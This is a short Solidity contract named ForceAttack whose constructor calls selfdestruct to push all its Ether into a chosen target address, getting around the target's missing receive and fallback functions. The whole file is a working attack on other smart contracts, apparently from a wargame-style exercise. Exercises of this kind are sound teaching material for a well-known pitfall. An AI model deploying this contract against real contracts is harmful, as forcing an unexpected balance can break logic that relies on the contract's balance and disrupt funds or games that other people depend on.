// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ForceAttack {
    constructor(address payable target) payable {
        // selfdestruct forces all Ether in this contract into target,
        // bypassing any lack of receive/fallback functions.
        selfdestruct(target);
    }
}
